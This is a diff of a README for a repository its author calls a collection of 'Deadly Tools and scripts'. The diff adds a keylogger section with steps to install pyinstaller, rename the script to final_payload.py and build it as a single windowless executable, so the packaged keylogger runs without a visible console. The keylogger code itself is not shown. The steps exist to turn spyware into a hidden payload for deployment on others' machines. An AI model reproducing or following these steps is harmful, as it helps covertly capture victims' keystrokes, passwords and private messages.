@@ -2,13 +2,19 @@
 A collections of Deadly Tools and scripts created by me
 
 
-for making exe of keylooger install library
+#1.keylogger 
+
+for making exe of keylooger 1st install library by executing this command 
+
 ```bash
 pip install pyinstaller
 ```
 
-then rename the scripy t file to ### final_payload.py
-then enter in terminal
+then rename the .py script 
+file to *final_payload.py*
+
+then enter this in terminal
+
 ```bash
 pyinstaller --onefile --noconsole final_payload.py
 ```
